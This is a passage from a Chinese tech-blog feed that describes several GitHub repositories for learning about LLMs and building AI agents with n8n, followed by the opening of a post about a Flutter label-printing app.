<li><strong>扩展阅读</strong>：相关论文、博客和技术资源推荐</li>
<li><strong>基础概念回顾</strong>：ML基础概念的快速参考指南</li>
</ul>
<h5 data-id="heading-41">🛠️ 实践工具</h5>
<ul>
<li><strong>工具分类体系</strong>：数据工程、模型开发、部署监控工具</li>
<li><strong>开源方案对比</strong>：各类MLOps工具的功能特性分析</li>
<li><strong>企业级选型</strong>：Build vs Buy决策框架</li>
<li><strong>技术栈集成</strong>：工具链整合和最佳实践</li>
</ul>
<h4 data-id="heading-42">产业影响价值</h4>
<h5 data-id="heading-43">🎯 目标受众</h5>
<ul>
<li><strong>ML工程师</strong>：系统设计能力提升和最佳实践学习</li>
<li><strong>数据科学家</strong>：从实验到生产的完整技能栈</li>
<li><strong>技术领导者</strong>：ML项目决策和团队建设指导</li>
<li><strong>产品经理</strong>：ML产品规划和技术理解</li>
</ul>
<h5 data-id="heading-44">🌟 独特价值</h5>
<ul>
<li><strong>第一性原理</strong>：深入理解ML系统设计的底层逻辑</li>
<li><strong>工程实践导向</strong>：软件工程最佳实践在ML领域的应用</li>
<li><strong>全局视角</strong>：端到端系统思维而非单点算法优化</li>
<li><strong>负责任AI</strong>：伦理考量和公平性设计的系统性方法</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合构建中大型ML系统的技术团队，特别是需要处理复杂业务需求、高并发场景和企业级部署要求的项目。是ML系统架构师和技术领导者的必备参考。</p>
<ul>
<li>模型服务和推理引擎</li>
<li>监控和告警系统</li>
</ul>
<hr/>
<h2 data-id="heading-45">7、LLMs from Scratch - 从零构建大语言模型</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frasbt%2FLLMs-from-scratch" target="_blank" title="https://github.com/rasbt/LLMs-from-scratch" ref="nofollow noopener noreferrer">github.com/rasbt/LLMs-…</a></p>
<p><strong>⭐ Stars：</strong>  21.5k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Python</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1035ab6aa066496b8206d2d856456201~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=7PayGUvVu8RBRv6db1yLDLaEBiM%3D" alt="" loading="lazy"/></p>
<p>Sebastian Raschka所著《Build a Large Language Model (From Scratch)》的官方代码仓库，通过从头编写代码的方式深入理解大语言模型的工作原理。该项目提供了完整的LLM开发、预训练和微调流程，是学习LLM内部机制的权威教程。</p>
<h4 data-id="heading-46">核心技术架构</h4>
<h5 data-id="heading-47">🧠 Transformer核心实现</h5>
<ul>
<li><strong>注意力机制</strong>：多头自注意力、位置编码和掩码机制的完整实现</li>
<li><strong>前馈网络</strong>：GELU激活函数和层归一化优化</li>
<li><strong>模型架构</strong>：完整GPT架构实现，支持124M到更大规模配置</li>
<li><strong>文本生成</strong>：采样策略、温度控制和top-k过滤技术</li>
</ul>
<h5 data-id="heading-48">⚡ 高性能训练优化</h5>
<ul>
<li><strong>分布式训练</strong>：支持多GPU并行训练和梯度累积</li>
<li><strong>内存优化</strong>：KV缓存、梯度检查点和混合精度训练</li>
<li><strong>训练加速</strong>：优化的数据加载器和批处理策略</li>
<li><strong>性能监控</strong>：tokens/sec指标和GPU内存使用追踪</li>
</ul>
<h4 data-id="heading-49">完整学习路径</h4>
<h5 data-id="heading-50">📚 分章节构建体系</h5>
<ul>
<li><strong>第1-2章</strong>：数据处理和分词器实现（GPTDatasetV1、create_dataloader_v1）</li>
<li><strong>第3章</strong>：注意力机制和多头注意力（MultiHeadAttention）</li>
<li><strong>第4章</strong>：GPT模型架构和文本生成（GPTModel、generate_text_simple）</li>
<li><strong>第5章</strong>：预训练流程和优化策略（train_model_simple）</li>
<li><strong>第6章</strong>：分类任务微调和LoRA技术（LinearWithLoRA）</li>
<li><strong>第7章</strong>：指令跟随微调和模型评估（InstructionDataset）</li>
</ul>
<h5 data-id="heading-51">🔬 高级技术特性</h5>
<ul>
<li><strong>LoRA微调</strong>：参数高效的模型适配技术，显著减少训练参数</li>
<li><strong>指令微调</strong>：对话和任务执行能力训练的完整流程</li>
<li><strong>模型评估</strong>：多维度性能评估和基准测试框架</li>
<li><strong>Llama3集成</strong>：现代LLM架构的实现和KV缓存优化</li>
</ul>
<h4 data-id="heading-52">工程实践亮点</h4>
<h5 data-id="heading-53">🛠️ 开发工具链</h5>
<ul>
<li><strong>模块化设计</strong>：可复用的组件库（ch02-ch07模块）和完整测试框架</li>
<li><strong>配置管理</strong>：灵活的模型配置和超参数设置（GPT_CONFIG_124M）</li>
<li><strong>实验追踪</strong>：损失曲线和训练指标可视化</li>
<li><strong>代码质量</strong>：完整的单元测试和Apache 2.0许可证</li>
</ul>
<h5 data-id="heading-54">📊 性能基准</h5>
<ul>
<li><strong>GPT-124M配置</strong>：完整的小规模模型训练（768维嵌入，12层，12头）</li>
<li><strong>训练效率</strong>：优化的训练速度和资源利用率监控</li>
<li><strong>模型质量</strong>：可比肩商业模型的生成质量</li>
<li><strong>硬件适配</strong>：笔记本到服务器环境的完整兼容性</li>
</ul>
<h4 data-id="heading-55">教育价值与应用</h4>
<h5 data-id="heading-56">🎓 学习资源生态</h5>
<ul>
<li><strong>配套课程</strong>：17小时视频教程深度讲解每章内容</li>
<li><strong>实践项目</strong>：从基础到高级的渐进式项目体系</li>
<li><strong>社区支持</strong>：活跃的GitHub Discussions和问题解答</li>
<li><strong>工具推荐</strong>：axolotl、LitGPT等生产级工具链集成</li>
</ul>
<h5 data-id="heading-57">💡 技术深度</h5>
<ul>
<li><strong>算法原理</strong>：深入理解Transformer架构的数学原理</li>
<li><strong>实现细节</strong>：每行代码的详细解释和设计思路</li>
<li><strong>最佳实践</strong>：业界标准的模型开发流程和优化策略</li>
<li><strong>前沿技术</strong>：最新LLM技术的实现和实际应用</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合希望深度理解LLM工作原理的开发者、研究人员和AI从业者。特别适用于需要定制化LLM解决方案的团队，以及希望在AI领域建立扎实技术基础的学习者。</p>
<hr/>
<h2 data-id="heading-58">8、 LLM Engineering - 大型语言模型工程实践</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fed-donner%2Fllm" target="_blank" title="https://github.com/ed-donner/llm" ref="nofollow noopener noreferrer">github.com/ed-donner/l…</a>_engineering</p>
<p><strong>⭐ Stars：</strong>  2.3k+ | <strong>📈 活跃度：</strong>  极高 | <strong>🏷️ 主要语言：</strong>  Jupyter Notebook</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae83fc7a0e1840ceadbbd04533fc9000~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=bwwXDeTf19BZ9DjbipzMFMBDO0M%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-59">项目概述</h4>
<p>Edward Donner开发的8周LLM工程师训练营，面向工程实践的大语言模型开发指南。涵盖从开发环境配置到部署的完整工程化流程，注重实战技能培养和最佳实践传授。</p>
<h4 data-id="heading-60">完整课程体系</h4>
<h5 data-id="heading-61">📚 8周渐进式学习路径</h5>
<ul>
<li><strong>第1周</strong>：LLM基础和Ollama本地部署（Llama 3.2）</li>
<li><strong>第2周</strong>：API集成和多模型对比（OpenAI、Anthropic、Google）</li>
<li><strong>第3周</strong>：Google Colab GPU训练和向量数据库</li>
<li><strong>第4-5周</strong>：RAG系统构建和知识检索优化</li>
<li><strong>第6-7周</strong>：模型微调和Weights &amp; Biases监控</li>
<li><strong>第8周</strong>：自主AI智能体解决方案</li>
</ul>
<h5 data-id="heading-62">🛠️ 工程实践重点</h5>
<ul>
<li><strong>环境配置</strong>：跨平台开发环境搭建（Windows、Mac、Linux）</li>
<li><strong>API成本管理</strong>：多厂商API使用和成本优化策略</li>
<li><strong>数据工程</strong>：大规模文本数据处理和质量控制</li>
<li><strong>生产部署</strong>：从原型到生产的完整部署流程</li>
</ul>
<h4 data-id="heading-63">技术栈与工具</h4>
<h5 data-id="heading-64">🔧 核心开发工具</h5>
<ul>
<li><strong>Anaconda环境</strong>：隔离的Python开发环境和依赖管理</li>
<li><strong>Jupyter Lab</strong>：交互式开发和数据科学工作流</li>
<li><strong>Google Colab</strong>：云端GPU训练和协作开发</li>
<li><strong>Ollama本地部署</strong>：本地LLM运行和测试环境</li>
</ul>
<h5 data-id="heading-65">🌐 多模型API集成</h5>
<ul>
<li><strong>OpenAI集成</strong>：GPT-4o、GPT-4o-mini的API调用和优化</li>
<li><strong>Anthropic Claude</strong>：Claude-3模型家族的使用和对比</li>
<li><strong>Google Gemini</strong>：Gemini API的集成和应用</li>
<li><strong>DeepSeek API</strong>：新兴模型的测试和评估</li>
</ul>
<h4 data-id="heading-66">实践项目与应用</h4>
<h5 data-id="heading-67">📋 渐进式项目构建</h5>
<ul>
<li><strong>会议纪要生成器</strong>：音频转录和智能总结</li>
<li><strong>RAG知识问答系统</strong>：文档检索和智能回答</li>
<li><strong>多智能体对话系统</strong>：智能体协作和角色扮演</li>
<li><strong>自主AI助手</strong>：端到端的智能体解决方案</li>
</ul>
<h5 data-id="heading-68">💡 工程化特色</h5>
<ul>
<li><strong>错误处理和调试</strong>：完整的troubleshooting指南</li>
<li><strong>成本监控</strong>：API使用量监控和成本控制</li>
<li><strong>环境兼容性</strong>：跨平台部署和环境一致性</li>
<li><strong>社区贡献</strong>：Pull Request流程和代码分享</li>
</ul>
<h4 data-id="heading-69">学习价值与职业发展</h4>
<h5 data-id="heading-70">🎯 技能提升维度</h5>
<ul>
<li><strong>数据工程师</strong>：LLM集成和数据管道优化</li>
<li><strong>软件工程师</strong>：AI能力集成和产品开发</li>
<li><strong>产品经理</strong>：AI产品规划和技术理解</li>
<li><strong>研究人员</strong>：快速原型开发和实验验证</li>
</ul>
<h5 data-id="heading-71">📈 职业发展路径</h5>
<ul>
<li><strong>AI开发岗位</strong>：自然语言处理和内容生成</li>
<li><strong>工程效率提升</strong>：自动化文档、邮件和报告生成</li>
<li><strong>决策支持系统</strong>：大数据洞察和智能分析</li>
<li><strong>创新产品开发</strong>：AI驱动的新产品和服务</li>
</ul>
<h4 data-id="heading-72">实战导向特色</h4>
<h5 data-id="heading-73">🚀 项目实施方法</h5>
<ul>
<li><strong>边学边做</strong>：每周实战项目和挑战任务</li>
<li><strong>代码分享</strong>：GitHub Pull Request和社区贡献</li>
<li><strong>成本控制</strong>：免费替代方案和预算管理</li>
<li><strong>持续学习</strong>：资源链接和扩展阅读</li>
</ul>
<h5 data-id="heading-74">🔬 技术深度</h5>
<ul>
<li><strong>伦理考量</strong>：AI偏见识别和公平性设计</li>
<li><strong>性能优化</strong>：推理延迟和吞吐量优化</li>
<li><strong>扩展性设计</strong>：从原型到企业级部署</li>
<li><strong>监控运维</strong>：生产环境监控和故障排除</li>
</ul>
<p><strong>最佳应用场景：</strong> 适合希望快速掌握LLM工程实践的开发者和技术团队。特别适用于需要将LLM技术快速集成到现有产品的企业，以及希望建立AI技术栈的初创公司。</p>
<h2 data-id="heading-75">9.  N8N Workflows Collection - 高性能工作流文档系统</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZie619%2Fn8n-workflows" target="_blank" title="https://github.com/Zie619/n8n-workflows" ref="nofollow noopener noreferrer">github.com/Zie619/n8n-…</a></p>
<p><strong>⭐ Stars：</strong>  约100+ | <strong>📈 活跃度：</strong>  高 | <strong>🏷️ 主要语言：</strong>  Python/JavaScript</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccedd61b13bb490b946f77279b947de5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=SEr6r0QtqpmD%2BKnOWATCVm%2Bb9es%3D" alt="" loading="lazy"/></p>
<p>N8N工作流集合，收录2,053个专业工作流，覆盖365种服务集成，配备高性能文档系统。基于先进的SQLite FTS5全文检索技术，响应时间&lt;100ms，为工作流自动化提供企业级的发现和管理平台。</p>
<h4 data-id="heading-76">🚀 核心功能特性</h4>
<h5 data-id="heading-77">📊 收录规模</h5>
<ul>
<li><strong>工作流总数</strong>：2,053个专业分类工作流</li>
<li><strong>节点总数</strong>：29,445个（平均每个工作流14.3个节点）</li>
<li><strong>服务集成</strong>：365种独特服务和API集成</li>
<li><strong>触发类型</strong>：Webhook、定时、手动、复杂触发系统</li>
</ul>
<h5 data-id="heading-78">⚡ 高性能技术架构</h5>
<ul>
<li><strong>SQLite + FTS5全文检索</strong>：sub-100ms响应时间，比传统系统快700倍</li>
<li><strong>智能分类系统</strong>：12个服务类别自动识别（消息、AI/ML、数据库等）</li>
<li><strong>响应式界面</strong>：完美支持移动端，深色/浅色主题切换</li>
<li><strong>RESTful API</strong>：完整API支持工作流搜索、下载、图表生成</li>
</ul>
<h4 data-id="heading-79">🔍 智能搜索与分类</h4>
<h5 data-id="heading-80">📂 服务类别覆盖</h5>
<ul>
<li><strong>消息通信</strong>：Telegram、Discord、Slack、WhatsApp、Teams</li>
<li><strong>AI/ML集成</strong>：OpenAI、Anthropic、Hugging Face AI服务</li>
<li><strong>数据库连接</strong>：PostgreSQL、MySQL、MongoDB、Redis、Airtable</li>
<li><strong>云存储管理</strong>：Google Drive、Dropbox、OneDrive文件同步</li>
<li><strong>项目管理</strong>：Jira、GitHub、GitLab、Trello、Asana协作</li>
</ul>
<h5 data-id="heading-81">🎯 复杂度分析</h5>
<ul>
<li><strong>低复杂度(≤5节点)</strong> ：35% - 简单自动化任务</li>
<li><strong>中等复杂度(6-15节点)</strong> ：45% - 标准业务流程</li>
<li><strong>高复杂度(16+节点)</strong> ：20% - 企业级系统集成</li>
</ul>
<h4 data-id="heading-82">💡 技术创新亮点</h4>
<h5 data-id="heading-83">🛠️ 智能命名系统</h5>
<pre><code class="hljs language-bash" lang="bash"> 
<span class="hljs-comment"># 自动转换技术文件名为可读标题</span>
​
前：2051_Telegram_Webhook_Automation_Webhook.json
​
后：Telegram Webhook Automation
</code></pre>
<h5 data-id="heading-84">📱 现代化界面特性</h5>
<ul>
<li><strong>实时统计仪表板</strong>：工作流活跃度和使用统计</li>
<li><strong>Mermaid图表生成</strong>：可视化工作流程图</li>
<li><strong>即时搜索</strong>：键入即搜索，防抖优化</li>
<li><strong>筛选器组合</strong>：触发类型、复杂度、服务类别多维筛选</li>
</ul>
<h4 data-id="heading-85">🏗️ 企业级特性</h4>
<h5 data-id="heading-86">🔐 部署与管理</h5>
<ul>
<li><strong>多环境支持</strong>：Python/Node.js双技术栈实现</li>
<li><strong>Docker容器化</strong>：一键部署和扩展</li>
<li><strong>API文档</strong>：OpenAPI标准，自动文档生成</li>
<li><strong>变更检测</strong>：MD5哈希算法，高效重建索引</li>
</ul>
<h5 data-id="heading-87">📈 性能指标</h5>
<ul>
<li><strong>数据库大小</strong>：&lt;50MB（比传统HTML系统小700倍）</li>
<li><strong>内存占用</strong>：&lt;50MB RAM（比旧系统少40倍）</li>
<li><strong>加载时间</strong>：&lt;1秒（比传统系统快10倍）</li>
<li><strong>搜索响应</strong>：即时FTS5全文检索</li>
</ul>
<hr/>
<h2 data-id="heading-88">10、Build AI Agents with N8N - LinkedIn Learning企业级课程</h2>
<p><strong>仓库地址：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLinkedInLearning%2Fbuild-ai-agents-and-automate-workflows-with-n8n-5437042" target="_blank" title="https://github.com/LinkedInLearning/build-ai-agents-and-automate-workflows-with-n8n-5437042" ref="nofollow noopener noreferrer">github.com/LinkedInLea…</a></p>
<p><strong>⭐ Stars：</strong>  新项目 | <strong>📈 活跃度：</strong>  官方维护 | <strong>🏷️ 主要语言：</strong>  JSON配置</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bc9fb176f3f4320adc86fadf8a3fb70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941884&amp;x-signature=Ny6tBG0ZOXY3ACoDLZT%2B8u%2Buh8Q%3D" alt="" loading="lazy"/></p>
<p>LinkedIn Learning平台官方推出的企业级AI智能体课程资料，由专业讲师Morten Rand-Hendriksen授课。提供完整的N8N智能体开发教程，从零基础到高级应用的系统性学习路径，专注于业务流程自动化和AI智能体构建。</p>
<h4 data-id="heading-89">🎯 课程核心内容</h4>
<h5 data-id="heading-90">📚 学习模块体系</h5>
<ul>
<li><strong>N8N平台基础</strong>：云端/本地部署选择、架构理解、核心概念掌握</li>
<li><strong>多服务集成</strong>：Google Sheets、OpenAI、Slack三大核心服务连接</li>
<li><strong>AI智能体设计</strong>：自然语言处理、数据查询、多步骤决策流程</li>
<li><strong>MCP协议应用</strong>：Model Context Protocol深度集成和自定义服务器开发</li>
</ul>
<h5 data-id="heading-91">🛠️ 实战工作流项目</h5>
<ul>
<li><strong>主要智能体</strong>：<code>Volunteer_Lookup.json</code> - 志愿者查询AI智能体</li>
<li><strong>Google Sheets MCP</strong>：<code>Google_Sheets_MCP.json</code> - 自定义MCP服务器集成</li>
<li><strong>数据查询工具</strong>：<code>Row_lookup.json</code> - 智能数据筛选和检索</li>
<li><strong>综合自动化流</strong>：<code>Built_Out_Automation_Flow.json</code> - 多智能体协作系统</li>
</ul>
<h4 data-id="heading-92">🚀 技术特色与创新</h4>
<h5 data-id="heading-93">🔧 企业级架构设计</h5>
<ul>
<li><strong>依赖管理</strong>：工作流导入顺序优化（Row_lookup → Google_Sheets_MCP → Volunteer_Lookup）</li>
<li><strong>API集成</strong>：OpenAI GPT模型调用和响应处理</li>
<li><strong>数据管理</strong>：111条完整志愿者数据集 + 9条测试数据集</li>
<li><strong>安全配置</strong>：凭证管理和API密钥保护机制</li>
</ul>
<h5 data-id="heading-94">💡 教学方法优势</h5>
<ul>
<li><strong>循序渐进</strong>：从简单概念到复杂系统的阶梯式学习</li>
<li><strong>实战导向</strong>：真实业务场景（志愿者管理系统）案例</li>
<li><strong>多平台支持</strong>：云端N8N和自托管环境双重选择</li>
<li><strong>详细文档</strong>：完整的设置说明和导入指南</li>
</ul>
<h4 data-id="heading-95">📊 实际应用价值</h4>
<h5 data-id="heading-96">🎯 目标用户群体</h5>
<ul>
<li><strong>业务分析师</strong>：学习无代码AI智能体开发</li>
<li><strong>自动化工程师</strong>：掌握企业级工作流设计</li>
<li><strong>产品经理</strong>：理解AI智能体产品开发流程</li>
<li><strong>技术团队负责人</strong>：评估N8N在企业中的应用潜力</li>
</ul>
<h5 data-id="heading-97">🔄 业务场景覆盖</h5>
<ul>
<li><strong>客户服务自动化</strong>：智能客服和查询响应系统</li>
<li><strong>数据处理流程</strong>：表格数据查询和报告生成</li>
<li><strong>团队协作优化</strong>：Slack集成的智能通知和任务分发</li>
<li><strong>业务流程智能化</strong>：复杂多步骤业务逻辑自动执行</li>
</ul>
<h4 data-id="heading-98">🏗️ 工程实践特色</h4>
<h5 data-id="heading-99">📋 完整开发流程</h5>
<pre><code class="hljs language-markdown" lang="markdown"> 
<span class="hljs-section"># 项目设置步骤</span>
​
<span class="hljs-bullet">1.</span> Google账户设置（推荐专用测试账户）
​
<span class="hljs-bullet">2.</span> OpenAI API密钥申请和项目创建
​
<span class="hljs-bullet">3.</span> Slack工作区配置（推荐专用测试环境）
​
<span class="hljs-bullet">4.</span> N8N实例部署（云端或本地环境）
</code></pre>
<h5 data-id="heading-100">🔍 数据结构设计</h5>
<ul>
<li><strong>志愿者信息模型</strong>：ID、姓名、联系方式、活动记录、管理者、状态</li>
<li><strong>CSV格式支持</strong>：标准化数据导入和Google Sheets集成</li>
<li><strong>虚构数据保护</strong>：完全AI生成的测试数据，无真实个人信息</li>
</ul>
<h5 data-id="heading-101">🎨 用户体验优化</h5>
<ul>
<li><strong>自然语言查询</strong>：支持复杂的人类语言指令</li>
<li><strong>智能响应格式</strong>：结构化的查询结果和友好的用户交互</li>
<li><strong>错误处理机制</strong>：完善的异常情况处理和用户提示</li>
</ul>
<hr/>
<h3 data-id="heading-102">总结</h3>
<p>这十个GitHub仓库构成了AI智能体技术栈的完整生态系统，从理论基础到工程实践，从开发工具到部署运维，为不同背景的开发者提供了系统性的学习路径。</p>
<h4 data-id="heading-103">技术发展趋势</h4>
<ol>
<li><strong>多模态智能体</strong>：集成视觉、语言和行为的综合智能系统</li>
<li><strong>自主学习能力</strong>：具备持续学习和自我优化的智能体架构</li>
<li><strong>企业级应用</strong>：面向垂直行业的专业化智能体解决方案</li>
<li><strong>安全与可控</strong>：可解释、可控制的负责任AI智能体设计</li>
</ol>
<h4 data-id="heading-104">学习建议</h4>
<ul>
<li><strong>基础阶段</strong>：从Microsoft的入门教程开始，建立智能体的基础概念</li>
<li><strong>深入阶段</strong>：通过LLM相关项目掌握核心技术原理</li>
<li><strong>实践阶段</strong>：使用N8N等工具快速构建原型和应用</li>
<li><strong>进阶阶段</strong>：学习生产级系统设计和工程最佳实践</li>
</ul>
<p>通过系统学习这些开源项目，开发者可以全面掌握AI智能体的设计思维、技术实现和工程化部署，为构建下一代智能化应用奠定坚实基础。</p>
<h3 data-id="heading-105">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[仿普贴标签实现一个自己的app]]></title>    <link>https://juejin.cn/post/7581769891499032595</link>    <guid>https://juejin.cn/post/7581769891499032595</guid>    <pubDate>2025-12-10T03:32:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581769891499032595" data-draft-id="7581751726505852971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="仿普贴标签实现一个自己的app"/> <meta itemprop="keywords" content="前端,Android"/> <meta itemprop="datePublished" content="2025-12-10T03:32:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火柴就是我"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            仿普贴标签实现一个自己的app
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火柴就是我
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:32:26.000Z" title="Wed Dec 10 2025 03:32:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>用flutter实现一个标签app,类似于dlabel 跟 普调标签。前期只专注于实现添加各种标签。</p>
<p>实现功能列表：</p>
<ol>
<li><code>添加矩形图元(支持设置圆角 设置是否填充 支持设置边框宽度)</code></li>
